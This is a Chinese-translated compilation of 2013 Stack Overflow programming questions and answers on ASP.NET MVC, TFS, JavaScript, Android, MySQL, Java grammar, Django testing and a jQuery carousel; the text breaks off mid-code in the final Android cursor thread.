您的自定义模型绑定器用于整个列表，而不仅仅是每个特定项目。当您通过实现 IModelBinder 从头开始​​编写新的活页夹时，您需要处理将所有项目添加到列表和列表前缀等。这不是简单的代码，请在[此处](https://github.com/ASP-NET-MVC/ASP.NET-Mvc-3/blob/master/mvc3/src/SystemWebMvc/Mvc/DefaultModelBinder.cs)检查 DefaultModelBinder 。

相反，您可以扩展`DefaultModelBinder`该类，让它像往常一样工作，然后将这两个属性设置为 true：

```
public class SelectableLookupAllSelectedModelBinder: DefaultModelBinder
{

    public override object BindModel(ControllerContext controllerContext, ModelBindingContext bindingContext)
    {
        //Let the default model binder do its work so the List<SelectableLookup> is recreated
        object model = base.BindModel(controllerContext, bindingContext);

        if (model == null)
            return null; 

        List<SelectableLookup> lookupModel = model as List<SelectableLookup>;
        if(lookupModel == null)
            return model;

        //The DefaultModelBinder has already done its job and model is of type List<SelectableLookup>
        //Set both InitialState and SelectedState as true
        foreach(var lookup in lookupModel)
        {
            lookup.InitialState = true;
            lookup.SelectedState = true;
        }

        return model;          
    } 
```

可以通过将绑定属性添加到操作参数来处理前缀，例如`[Bind(Prefix="viewModel")]`

所以最后你的动作方法参数看起来像：

```
[Bind(Prefix="viewModel")]
[ModelBinder(typeof(SelectableLookupAllSelectedModelBinder))] 
List<SelectableLookup> classificationItems 
```

# tfs - 如何以编程方式操作挂起的更改窗口？

> ID：14853141
> 
> 赞同：0
> 
> 时间：2013-02-13T12:03:05.220
> 
> 标签：tfs, visual-studio-2012, visual-studio-sdk, tfs-sdk

我正在创建 TFS 合并向导的克隆以添加新功能。

我已经与workspakce.Merge api 合并。现在我需要一种以编程方式显示 Pending Changes - Conflict Window 的方法。

我已经有一个来自 PendingChangesExt 的 IVsWindowFrame，例如：

```
 GetStatus status = sourceExplorer.Workspace.Merge(sourcePath, targetPath, versionFrom, versionTo, LockLevel.None, RecursionType.Full, MergeOptionsEx.None);

   IVsWindowFrame frame = pendingChanges.VsWindowFrame;
   frame.Show(); 
```

当我调用 show() 时，Pending Changes 窗口会用结帐文件刷新，但我需要选择此屏幕中的最后一个按钮（冲突），以显示合并的冲突。

如何通过 IVsWindowFrame 以编程方式单击此屏幕上的 Conflict 按钮？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-18T17:46:34.013

我在 Chad Boles 的帮助下找到了解决方案：

```
public void refreshPendingChanges()
{
  Object customIn = null;
  Object customOut = null;

  //Show TfsPendingChanges
  m_applicationObject.ExecuteCommand("View.TfsPendingChanges", "");

  //Refresh
  m_applicationObject.Commands.Raise("{FFE1131C-8EA1-4D05-9728-34AD4611BDA9}", 4808, ref customIn, ref customOut);

  //Activate Source Explorer
  m_applicationObject.DTE.Windows.Item("{99B8FA2F-AB90-4F57-9C32-949F146F1914}").Activate(); //I get this GUID recording a Macro.
  //Show Conflicts
  m_applicationObject.DTE.ExecuteCommand("File.TfsResumeConflictResolution"); 
} 
```

感谢 Chad Boles，说我关于 File.TfsResumeConflictResolution ！

# javascript - 无法访问单选按钮列表的选定值

> ID：14853142
> 
> 赞同：0
> 
> 时间：2013-02-13T12:03:05.733
> 
> 标签：javascript, .net

我有一个单选按钮列表

```
 <asp:RadioButtonList CssClass="radioLable" ID="rbListPointsCat" runat="server"   RepeatDirection="Horizontal"
                    AutoPostBack="true" OnSelectedIndexChanged="rbListPointsCat_SelectedIndexChanged">
                    <asp:ListItem runat="server" Value="Yes" />
                    <asp:ListItem runat="server" Value="No" />
                </asp:RadioButtonList> 
```

我正在使用以下 JS 函数

```
 function CheckValue(sender, args) {

        var rblist = document.getElementById('<% =rbListPointsCat.ClientID%>');
        for (var x = 0; x < rblist.cells.length; x++) {
            if (rblist.cells[x].checked) {
                var Choice = (rblist.cells[x].innerText);
                alert(Choice);
            }
        }

        if (Choice=="No") {
            if (txtRemarks.value == "") {
                args.IsValid = false;
            }
            else {
                args.IsValid = true;
            }
        }
        else {
            args.IsValid = true;
        }
    } 
```

但无法获得检查的 valur ..它即将是未定义的。请让我知道我哪里出错了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:06:31.800

直呼其名，

```
 function CheckValue(sender, args) {

    var rblist = document.getElementByName('<% =rbListPointsCat.ClientID%>');
    for (var x = 0; x < rblist.cells.length; x++) {
        if (rblist.cells[x].checked) {
            var Choice = (rblist.cells[x].innerText);
            alert(Choice);
        }
    }

    if (Choice=="No") {
        if (txtRemarks.value == "") {
            args.IsValid = false;
        }
        else {
            args.IsValid = true;
        }
    }
    else {
        args.IsValid = true;
    }
} 
```

# asp.net - 通过 MVC 4 登录 LDAP Active Directory

> ID：14853153
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:03:48.220
> 
> 标签：asp.net, asp.net-mvc-4, active-directory

我在验证用户时遇到了真正的麻烦。

谁登录有两种情况：

*   用户已在域上注册。

*   用户是外部客户。

以及两种访问场景：

*   用户在域上

*   用户在外部 PC 上。

所以我希望做的是：

1.  获取用户的 windows 登录，并尝试通过 LDAP 验证登录。

2.  如果失败，它们要么未在域上注册，要么未在域 PC 上。所以会出现一个表格来输入信息。

3.  然后表单将检查 LDAP（注册用户），否则检查站点 DB（外部用户）。

我尝试了一些指南和一个 Intranet 应用程序。所做的只是将我的用户名扔到屏幕上。不管什么。我不知道如何验证它，因为我找不到任何与之相关的代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:07:43.097

将您的站点配置为同时实现 Windows 身份验证和 Forms 身份验证是不可能的。

您应该部署您的应用程序两次。

1.  一次用于 AD 授权，如果您的用户已登录，该授权将通过。
2.  另一个用于表单身份验证并提供登录框。

请务必在您的 IIS 管理器中设置相应的授权选项。

您可以选择仅实施表单身份验证。然后选择使用会员资格提供商来验证您的 AD 凭据。但是使用该 PC 上的登录用户的 pass-trough 选项不是很安全

# android - 音频标签在 Android 中的 HTML 中不起作用

> ID：14853154
> 
> 赞同：1
> 
> 时间：2013-02-13T12:03:48.357
> 
> 标签：android, html5-audio

我在android inapp webview中使用了以下测试html

**测试环境：** *安卓4.1平板*

**只有第 4 种方法适用于网站 url**

**1,2 和 3 不起作用**，它们显示播放按钮，但一旦单击它直接移动到结束。

还放置了测试图像以检查路径是否正确并加载图像。

请检查我是否做错了什么

```
<!DOCTYPE html>
<html>

<body>

        1(relative Path). <audio controls="controls"> <source
            src="clima_Audio_1528708600.mp3" type="audio/mpeg" />
        Audio not supported </audio><br/><br/><br/>

        2(absolute path). <audio controls="controls"> <source
            src="file:///sdcard/testapp//clima_Audio_1528708600.mp3" type="audio/mpeg" />
        Audio not supported </audio><br/><br/><br/>

        3(absolute path). <audio controls="controls"> <source
            src="file:///sdcard/testapp//horse.mp3" type="audio/mpeg" />
        Audio not supported </audio><br/><br/><br/>

        4(web url). <audio controls="controls"> <source
            src="http://www.w3schools.com/tags/horse.mp3" type="audio/mpeg" />
        Audio not supported </audio><br/>

    <img src="file:///sdcard/testapp/test.png"/>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:00:59.943

1（相对路径）

根据我的经验，我只能使用完整的本地路径，并在应用程序中嵌入一首歌曲：

```
<audio controls="controls">
    <source src="/android_asset/www/clima_Audio_1528708600.mp3" type="audio/mpeg" />
            Audio not supported 
</audio> 
```

“android_assets”是你的“assets”文件夹（是的，它很棘手，但它有效）

2（绝对路径）

您不能直接从 WebView 直接访问位于 sd 卡上的文件。[我建议在Tourizo 博客](http://blog.tourizo.com/2009/02/how-to-display-local-file-in-android.html)上阅读有关它的帖子。

3（绝对路径）

与2相同的问题。

# php - 关于mysql和php

> ID：14853156
> 
> 赞同：-7
> 
> 时间：2013-02-13T12:03:52.847
> 
> 标签：php, mysql, sql, count

我想从我的表中获取 X == 7 的行数

```
+----+----------+-------+---+   
| id | username | email | X |
+----+----------+-------+---+
|  1 |          |       | 7 |
|  2 |          |       | 7 |
|  3 |          |       | 7 |
|  4 |          |       |   |
|  5 |          |       |   |
+----+----------+-------+---+ 
```

有 3 行 X == 7

**我怎样才能得到这些行的数量？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:05:00.407

```
SELECT COUNT(id) FROM yourtable where x = 7; 
```

[**SQL 小提琴演示**](http://www.sqlfiddle.com/#!2/b9fa6/1)

这将为您提供一个值：

```
| COUNT(ID) |
-------------
|         3 | 
```

* * *

如果要对 x 的所有值执行此操作，请添加`GROUP BY`：

```
SELECT x, COUNT(id) TheCount
FROM yourtable
GROUP BY x; 
```

[**更新的 SQL Fiddle 演示**](http://www.sqlfiddle.com/#!2/5b22c/2)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:07:43.910

```
$sql = "SELECT count(*) FROM `table` WHERE X = 7"; 
$result = $con->prepare($sql); 
$result->execute(); 
$number_of_rows = $result->fetchColumn(); 
```

从[使用 PDO 计数](https://stackoverflow.com/q/883365/1456376)

作为说明：

[**请不要`mysql_*`在新代码中使用函数**](https://stackoverflow.com/q/12859942/)。它们不再被维护[并被正式弃用](https://wiki.php.net/rfc/mysql_deprecation)。看到[**红框**](https://www.php.net/manual/en/function.mysql-connect.php)了吗？改为了解[*准备好的语句*](https://en.wikipedia.org/wiki/Prepared_statement)，并使用[PDO](http://php.net/pdo)或[MySQLi](http://php.net/mysqli) -[本文](https://php.net/manual/en/mysqlinfo.api.choosing.php)将帮助您决定使用哪个。如果您选择 PDO，[这里有一个很好的教程](http://www.brightmeup.info/article.php?a_id=2)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T12:04:54.437

`count`只需在 SQl 查询中使用正则即可。

```
SELECT COUNT(*) FROM `yourTable` WHERE `X`=7; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T12:10:55.713

如果列 x 是`INT`使用类型

```
SELECT COUNT(1) FROM tableName WHERE X=7 
```

如果列 x 是`varchar`使用类型

```
SELECT COUNT(1) FROM tableName WHERE X='7' 
```

我相信你有 x 列作为整数...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:05:52.193

```
SELECT count(id) FROM table_name WHERE x='7' 
```

不过真的，下次去google搜一下^^

# java - java语法中具有多个类型参数列表的构造函数

> ID：14853165
> 
> 赞同：4
> 
> 时间：2013-02-13T12:04:35.020
> 
> 标签：java, grammar, specifications, jls

Java 语言规范 v7 中的[java 语法](http://docs.oracle.com/javase/specs/jls/se7/html/jls-18.html)为构造函数指定了以下语法规则：

```
Primary:
    ...
    new Creator
    ...

Creator:  
    NonWildcardTypeArguments CreatedName ClassCreatorRest
    CreatedName ( ClassCreatorRest | ArrayCreatorRest )

CreatedName:   
    Identifier [TypeArgumentsOrDiamond] { . Identifier [TypeArgumentsOrDiamond] }

ClassCreatorRest: 
    Arguments [ClassBody] 
```

这里让我困惑的是`CreatedName`规则。因此，诸如

```
new Class1<Integer>.Class2<Integer>(); 
```

将是有效的构造函数。他们当然不是。

事实上，我找不到任何情况下标识符链（例如`Class1.Class2`）会有多个类型参数列表（例如`<Integer>`）。这种情况是否存在，或者语法没有意义？

作为参考， JLS[第 15.9 节](http://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.9)中给出的等效语法规则也存在同样的问题（这些规则引用了[第 4.3 节](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.3)`TypeDecl`中定义的非终结符）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:26:41.083

此规则看起来像是在单个规则中允许两者的技巧：

*   `new Class1<...>();`
*   `new Class1.Class2<...>(); // Where Class2 is a static inner class`

允许的表达式：`new Class1<Integer>.Class2<Integer>();`永远不会在 Java 中编译，因为：

> 成员类型 Class1.Class2 不能用参数化类型限定，因为它是静态的。从限定类型 Class1 中删除参数

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:25:24.720

该语法只是描述了一组有效的 Java 源代码。据我所知，只有最后一个`TypeArgumentsOrDiamond`可能存在，但您正在查看的（简化）语法不处理这种极端情况。

# python - 姜戈。测试用例没有运行

> ID：14853176
> 
> 赞同：2
> 
> 时间：2013-02-13T12:04:53.960
> 
> 标签：python, django

为什么如果我`python manage.py test appname`在终端中运行是： Ran 0 tests in 0.000s OK

这是我的tests.py：

```
from django.test import TestCase
import appname.factories

class UserProfileTest(TestCase):
    def sample_data(self):
        for i in range(0, 10):
            user = appname.factories.UserProfileFactory.create() 
```

我的模型.py：

```
from django.db import models

class UserProfile(models.Model):
    street = models.CharField(max_length=250)
    tel = models.CharField(max_length=64, default='', blank=True)
    postcode = models.CharField(max_length=250)

    def __unicode__(self):
        return self.tel 
```

我的 factory.py（工厂男孩）：

```
from appname.models import *
import factory

class UserProfileFactory(factory.Factory):
    FACTORY_FOR = UserProfile

    street = factory.Sequence(lambda n: 'Street' + n)
    tel = factory.Sequence(lambda n: 'Tel' + n)
    password = 'abcdef' 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T12:18:17.963

您的个人测试功能应以“测试”一词开头。

您需要将功能更改`def sample_data(self):`为`def test_sample_data(self):`

`tests.py`测试运行程序将在名为`unittest.TestCase`. 然后它将运行该类中以单词 test 开头的任何函数（加上一两个其他函数，例如`setup()`）

我可能很迟钝，但我在[主要的 django 测试文档](https://docs.djangoproject.com/en/1.4/topics/testing/)中看不到任何东西，说明函数必须以单词 test 开头。[无论如何，这个](https://docs.djangoproject.com/en/dev/intro/tutorial05/#running-tests)（官方）教程中有对要求的参考。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T12:06:49.020

`test.py`错了，应该是`tests.py`

说[有关编写测试的文档](https://docs.djangoproject.com/en/dev/topics/testing/overview/#writing-tests)：

> 对于给定的 Django 应用程序，测试运行程序会在两个地方查找单元测试：
> 
> *   模型.py 文件。测试运行器在此模块中查找 unittest.TestCase 的任何子类。
> *   **应用程序目录中名为 tests.py**的文件——即保存 models.py 的目录。同样，测试运行器在此模块中查找 unittest.TestCase 的任何子类。

# jquery - 如何让旋转木马四处走动？

> ID：14853183
> 
> 赞同：1
> 
> 时间：2013-02-13T12:05:15.720
> 
> 标签：jquery

我有一个旋转木马，无论你向左还是向右，它都能很好地工作。但我希望它循环而不是停止一种方式。如果单击右手箭头，我已经让它循环正常。但是左手好像练不出来。

脚本：

```
 $('.carousel-next-page').click(function () {
        var carousel = $(this).parents('.carousel').find('ul');
        var scroll = carousel.scrollLeft();
        var w = carousel.width();
        var x = 0;
        carousel.find('li').each(function (i) {
            if ($(this).position().left < w) {
                x = $(this).position().left;
            }
            if ($(this).position().left < 0) {
                carousel.animate({ scrollLeft: 0 }, 'fast');
                return false;
            }
           // alert("this position = " + $(this).position().left + ", Width = "+ w + ", x = " + x)
        });
        carousel.animate({ scrollLeft: scroll + x }, 'fast');
        return false;
    });
    $('.carousel-prev-page').click(function () {
        var carousel = $(this).parents('.carousel').find('ul');
        var scroll = carousel.scrollLeft();
        var w = carousel.width();
        var x = 0;
        carousel.find('li').each(function (i) {
            if ($(this).position().left < 1 - w)
            {
                x = $(this).position().left;
            }

            //if ($(this).position().left > 0) {
            //    carousel.animate({ scrollLeft: carousel.find('li:last').position().left }, 'fast');
            //    return ;
            //}               

        });
        if (x == 0) {
            carousel.animate({ scrollLeft: 0 }, 'fast');
        } else {
            carousel.animate({ scrollLeft: scroll + x }, 'fast');
        }
        return false;
    }); 
```

HTML：

```
<div class="carousel">        
       <div class="float-left" style="margin-top:25px;">                
            <a href="#" class="carousel-prev-page"><span><img src="/gfx/smallLeftArrow.png" alt=""></span></a>
       </div>
       <ul>
                <li>
                    <img src="/slideshow/a8902970-b083-4bc7-a05d-eb296771ffd0.png">
                </li>
                <li>
                    <img src="/slideshow/59af2104-c73d-4f1f-91c6-476c1da47420.png">
                </li>                    

                <li>
                    <img src="/slideshow/f225100a-d8bf-4dc9-b552-01db65c110b3.png">
                </li>
                <li>
                    <img src="/slideshow/7efbf5d5-fcdd-4127-b8cf-5a36d5a507a8.png">
                </li>
                <li>
                    <img src="/slideshow/b1b9184f-aaed-4658-9fbe-5fc3b86975d1.png">
                </li>
                <li>
                    <img src="/slideshow/a3b493b5-6302-44f8-83e0-2a3a060013e6.png">
                </li>
                <li>
                    <img src="/slideshow/cac1b555-e155-48d8-960f-00d25eaf2dde.png">
                </li>
       </ul>
        <div class="float-left" style="margin-top:25px;">              
              <a href="#" class="carousel-next-page"><span><img src="/gfx/smallRightArrow.png" alt=""></span></a>
       </div>
</div> 
```

CSS：

```
.carousel ul { overflow:hidden; white-space:nowrap; margin:0; padding:0; list-style:none; position:relative; width:700px; float:left; }

.carousel li { display:inline-block; }   

.carousel-prev-image, .carousel-next-image, .carousel-prev-page, .carousel-next-page
{
    width: 15px;
    height: 25px;
}

.carousel-prev-image, .carousel-prev-page
{
    margin-left:15px;
    margin-right:5px;
}

.carousel-next-image, .carousel-next-page
{
    margin-right:15px;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:37:01.357

您可以做的是首先将您的下一个和上一个方法放入它们自己的函数中：

```
function nextSlide() { ... }
function prevSlide() { ... } 
```

编辑：起初我以为你想让它们自动循环。这第一步实际上不是必需的，但会使函数易于重用。

...然后给每个`.carousel`元素一个`data-*`属性和循环基于：

```
var slideNumber = 1;

// Loop through each carousel 'slide' adding a data-slide attribute
$('.carousel ul li').each(function() {
    $(this).attr('data-slide', slideNumber++);
}) 
```

...设置当前的“初始”幻灯片：

```
var currentSlide = 1; 
```

...然后在您更改幻灯片的函数中，确定下一张和上一张幻灯片（其中 slideNumber 现在是幻灯片的总数（轮播中的列表项目））：

```
var nextSlide = (currentSlide + 1) >= slideNumber ? 1 : currentSlide + 1;
var prevSlide = (currentSlide - 1) < 1 ? slideNumber - 1 : currentSlide - 1; 
```

...然后设置下一个或上一个列表项的位置（取决于您希望滑块循环的方式）：

```
$('.carousel ul li[data-slide="' + nextSlide + '"]').css({left:'100%'});
$('.carousel ul li[data-slide="' + prevSlide + '"]').css({left:'-100%'}); 
```

...然后通过单击时调用函数来进行幻灯片更改。

让我为此制作一个 JSFiddle。

编辑：[这是 JSFiddle 示例](http://jsfiddle.net/25jPe/)。您需要防止在动画完成之前单击上一个和下一个按钮，以防止它中断。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-19T19:34:44.050

它基本上在内联div上运行

HTML

```
<div class="wrapper">
<div class="slide_container"><div class="slide">4</div><div class="slide">5</div><div  class="slide">6</div><div class="slide">1</div><div class="slide">2</div><div class="slide">3</div></div></div>
<button id="left">Left</button>
<button id="right">Right</button> 
```

CSS

```
.wrapper{height:60px;width:200px;border:gray solid 10px;background:#ccc;overflow:hidden}
.slide_container{margin-left:-600px;height:60px;width:4000px}
.slide{background:#aaa;height:60px;width:200px;display:inline-block;} 
```

JS

```
var slider = function(dir){
if(dir==1){
    $('.slide_container .slide:first').animate({'width':0},200,function(){$(this).appendTo($('.slide_container')).removeAttr('style');});

}else if(dir==-1){
    $('.slide_container .slide:last').css('width',0).prependTo($('.slide_container ')).animate({'width':200},200,function(){$(this).removeAttr('style');});
}
}

$('#left').click(function(){slider(1)});
$('#right').click(function(){slider(-1)}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T09:19:57.400

我解决了！

```
 $('.carousel-prev-page').click(function () {
        var carousel = $(this).parents('.carousel').find('ul');
        var scroll = carousel.scrollLeft();
        var w = carousel.width();
        var x = 0;
        var beggining = false;
        carousel.find('li').each(function (i) {
            if ($(this).position().left < 1 - w)
            {
                x = $(this).position().left;
            }         
            if ($(this).position().left == 0)
            {
                beggining = true;
            }
        });
        //alert(x);
        if (beggining) {
            carousel.animate({ scrollLeft: carousel.find('li:last').position().left }, 'fast');
            return false;
        }
        else if (x == 0) {
            carousel.animate({ scrollLeft: 0 }, 'fast');
        } else {
            carousel.animate({ scrollLeft: scroll + x }, 'fast');
        }
        return false;
    }); 
```

# java - 为什么我的 ListView 方法会引发“陈旧对象状态”异常？

> ID：14853185
> 
> 赞同：0
> 
> 时间：2013-02-13T12:05:22.527
> 
> 标签：java, android, staleobjectstate, staledataexception

目前在我的应用程序中，当我调用从我的数据库中更新 ListView 的方法时，我遇到了一个过时的对象异常。

在查询我的数据库时，我一直小心地关闭所有游标，当通过使用“startManagingCursor”返回游标时，我也管理我的游标，但我仍然遇到这个问题。

目前，当我向我的数据库添加一个新项目时，我想起了我类的私有方法中的 ListView 更新方法。这是对象抛出异常的地方。

我读过人们“刷新”会话，而且我相信数据库版本会出现这种情况？但总的来说，我被卡住了，无法解决这个问题。

更新错误：

02-13 13:23:06.588: E/AndroidRuntime(287): 致命异常: main 02-13 13:23:06.588: E/AndroidRuntime(287): android.database.StaleDataException: 访问关闭游标 02-13 13: 23:06.588: E/AndroidRuntime(287): 在 android.database.AbstractWindowedCursor.checkPosition(AbstractWindowedCursor.java:217) 02-13 13:23:06.588: E/AndroidRuntime(287): 在 android.database.AbstractWindowedCursor.getInt (AbstractWindowedCursor.java:84) 02-13 13:23:06.588: E/AndroidRuntime(287): at com.example.flybase2.ShoppingList.updateTotal(ShoppingList.java:248) 02-13 13:23:06.588: E /AndroidRuntime(287): 在 com.example.flybase2.ShoppingList.access$1(ShoppingList.java:231) 02-13 13:23:06.588: E/AndroidRuntime(287): 在 com.example.flybase2.ShoppingList$2。 onClick(ShoppingList.java:350) 02-13 13:23:06.588: E/AndroidRuntime(287): at com.android。internal.app.AlertController$ButtonHandler.handleMessage(AlertController.java:158) 02-13 13:23:06.588: E/AndroidRuntime(287): at android.os.Handler.dispatchMessage(Handler.java:99) 02-13 13:23:06.588: E/AndroidRuntime(287): 在 android.os.Looper.loop(Looper.java:123) 02-13 13:23:06.588: E/AndroidRuntime(287): 在 android.app.ActivityThread .main(ActivityThread.java:4627) 02-13 13:23:06.588: E/AndroidRuntime(287): at java.lang.reflect.Method.invokeNative(Native Method) 02-13 13:23:06.588: E/ AndroidRuntime(287): at java.lang.reflect.Method.invoke(Method.java:521) 02-13 13:23:06.588: E/AndroidRuntime(287): at com.android.internal.os.ZygoteInit$MethodAndArgsCaller .run(ZygoteInit.java:868) 02-13 13:23:06.588: E/AndroidRuntime(287): 在 com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626) 02-13 13:23 :06.588:E/AndroidRuntime(287): 在 dalvik.system.NativeStart.main(Native Method)

这是我调用 ListView 的类：

```
package com.example.flybase2;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.Dialog;
import android.app.ListActivity;
import android.content.DialogInterface;
import android.database.Cursor;
import android.os.Bundle;
import android.support.v4.widget.SimpleCursorAdapter;
import android.text.Editable;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;

public class ShoppingList extends ListActivity implements OnClickListener {

Button AddItem;
ListView showItems;
SimpleCursorAdapter cursorAdapter;
Long itemId;
EditText totalPrice;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.shoppinglistlayout);

    AddItem = (Button) findViewById(R.id.btnAddItem);

    showItems = (ListView)findViewById(android.R.id.list);

    totalPrice = (EditText)findViewById(R.id.totalListPrice);

    AddItem.setOnClickListener(this);

    setList();

}
    ERROR**********************************8
@Override
public void onClick(View clickedAdd) {

    show();

}

@Override
protected void onListItemClick(ListView l, View v, int position, long idd) {
    super.onListItemClick(l, v, position, idd);

     itemId = idd;

final CharSequence[] items = {"Edit Item", "Delete Item", "Show Most Purchased Item"};

    Builder alertDialogBuilder = new AlertDialog.Builder(ShoppingList.this);

    alertDialogBuilder.setTitle("Item Options:");

    alertDialogBuilder.setItems(items, new DialogInterface.OnClickListener() {

        public void onClick(DialogInterface dialog, int item) {

            if (items[item].equals("Edit Item")) {

                AlertDialog.Builder builder = new AlertDialog.Builder(ShoppingList.this);

                builder.setTitle("Edit Item");

                DBHandlerShop setEdit = new DBHandlerShop(ShoppingList.this, null, null);

                setEdit.open();
                String itemName = setEdit.getItem(itemId);
                int itemAmount = setEdit.getItemQuan(itemId);
                int itemPrice = setEdit.getItemCost(itemId);
                setEdit.close();
                                    LinearLayout layout = new LinearLayout(ShoppingList.this);
                                    layout.setOrientation(LinearLayout.VERTICAL);

                                    final EditText titleBox = new EditText(ShoppingList.this);
                                    titleBox.setText(itemName);
                                    titleBox.setHint("Item Name:");
                                    layout.addView(titleBox);

                                    final EditText quantityBox = new EditText(ShoppingList.this);
                                    quantityBox.setText(Integer.toString(itemAmount));
                                    quantityBox.setHint("Item Quantity");
                                    layout.addView(quantityBox);

                                    final EditText priceBox = new EditText(ShoppingList.this);
                                    priceBox.setText(Integer.toString(itemPrice));
                                    priceBox.setHint("Item Price.");
                                    layout.addView(priceBox);

                                    builder.setView(layout);

                                    builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int whichButton) {

                                        Editable valueItem = titleBox.getText();
                                        Editable valueAmount = quantityBox.getText();
                                    Editable valuePrice = priceBox.getText();

                                   String itemDescription = valueItem.toString();
                                    String s = valueAmount.toString();
                                    int itemAmount = Integer.parseInt(s);
                                    String a = valuePrice.toString();
                                    int itemPrice = Integer.parseInt(a);
                                    try{
                                                DBHandlerShop update = new DBHandlerShop(ShoppingList.this, null, null);
                                                update.open();
                                                update.updateItem(itemId, itemDescription, itemAmount, itemPrice);
                                                update.close();
                                    }
                                    catch(Exception e)
                                    {
                                        Dialog e1 = new Dialog(ShoppingList.this);
                                        e1.setTitle("Item unsuccesfully updated");
                                        TextView txt = new TextView(ShoppingList.this);
                                        txt.setText("Success");
                                        e1.setContentView(txt);
                                        e1.show();
                                    }
                                    finally
                                    {
                                        Dialog e1 = new Dialog(ShoppingList.this);
                                        e1.setTitle("Item succesfully updated");
                                        TextView txt = new TextView(ShoppingList.this);
                                        txt.setText("Success");
                                        e1.setContentView(txt);
                                        e1.show();

                                        setList();

                                    int cost = updateTotal();
                                        totalPrice.setText(cost);
                                    }

                                      }

                                    });

                                    builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                                      public void onClick(DialogInterface dialog, int whichButton) {

                                      }
                                    });

                                    builder.show();

            }

            else if (items[item].equals("Delete Item")) 
            {

                   DBHandlerShop delete = new DBHandlerShop(ShoppingList.this,null, null);

                   delete.open();
                   delete.deleteItem(itemId);
                   delete.close();

                   setList();

            }

            else if (items[item].equals("Show Most Purchased Item")) 
            {

            }

            }  

        });

    alertDialogBuilder.show();

}

private void setList() {

    DBHandlerShop DBShop = new DBHandlerShop(this, null, null);

    DBHandlerShop searchItems = new DBHandlerShop(this, null, null);

    searchItems.open();

    Cursor cursor = searchItems.getItems();

    startManagingCursor(cursor);

    String [] from = new String [] {DBShop.KEY_ITEMSHOP, DBShop.KEY_ITEMNUM, DBShop.KEY_ITEMPRICE};
    int [] to = new int [] {R.id.txtSetItem, R.id.txtSetAmount, R.id.txtSetPrice};

    cursorAdapter = new SimpleCursorAdapter(this, R.layout.setshoppinglist, cursor, from, to);
    showItems.setAdapter(cursorAdapter);

}

private int updateTotal() {

    DBHandlerShop total = new DBHandlerShop(this, null, null);

    int totalPrice = 0;
    total.open();
    Cursor totalPrices = total.getTotals();
    total.close();

     if (totalPrices != null) {

         startManagingCursor(totalPrices);
         if (totalPrices.moveToFirst()) {

             do {
                 int cost = totalPrices.getInt(3);
                 totalPrice += cost;

             } while (totalPrices.moveToNext());

             return totalPrice;
         }

     }

    return 0;

}

private void show()
{

    AlertDialog.Builder builder = new AlertDialog.Builder(ShoppingList.this);

        builder.setTitle("Enter Item Details:");

                            LinearLayout layout = new LinearLayout(this);
                            layout.setOrientation(LinearLayout.VERTICAL);

                            final EditText titleBox = new EditText(this);

                            titleBox.setHint("Item Name:");
                            layout.addView(titleBox);

                            final EditText quantityBox = new EditText(this);

                            quantityBox.setHint("Item Quantity");
                            layout.addView(quantityBox);

                            final EditText priceBox = new EditText(this);

                            priceBox.setHint("Item Price.");
                            layout.addView(priceBox);

                            builder.setView(layout);

                            builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int whichButton) {
                            try
                            {

                                Editable valueItem = titleBox.getText();
                                Editable valueAmount = quantityBox.getText();
                            Editable valuePrice = priceBox.getText();

                                String itemDescription = valueItem.toString();
                                String s = valueAmount.toString();
                                int itemAmount = Integer.parseInt(s);
                                String a = valuePrice.toString();
                                int itemPrice = Integer.parseInt(a);

                            DBHandlerShop addItem = new DBHandlerShop(ShoppingList.this, null, null);
                            addItem.open();
                            addItem.insertItems(itemDescription, itemAmount, itemPrice);
                            addItem.close();

                            }
                            catch(Exception e)
                            {
                            Dialog e1 = new Dialog(ShoppingList.this);
                            e1.setTitle("Item unsuccesfully added");
                            TextView txt = new TextView(ShoppingList.this);
                            txt.setText("Success");
                            e1.setContentView(txt);
                            e1.show();

                            }
                            finally
                            {
                                Dialog e = new Dialog(ShoppingList.this);
                            e.setTitle("Item succesfully added.");
                            TextView txt = new TextView(ShoppingList.this);
                            txt.setText("Success");
                            e.setContentView(txt);
                            e.show();

                        setList();

                    int cost = updateTotal();
                        totalPrice.setText(cost);

                            }

                              }

                            });

                            builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                              public void onClick(DialogInterface dialog, int whichButton) {

                              }
                            });

                            builder.show();

}
} 
```

这是从数据库返回的游标：

```
 public Cursor getItems() {

        String [] columns = new String[]{KEY_ROWSHOPID, KEY_ITEMSHOP, KEY_ITEMNUM, KEY_ITEMPRICE};
        Cursor c = ourDatabase.query(DATABASE_TABLESHOP, columns, null, null, null, null, null);
         if(c != null && c.getCount() > 0)
        {
        c.moveToFirst();
        c.close();
        return c;
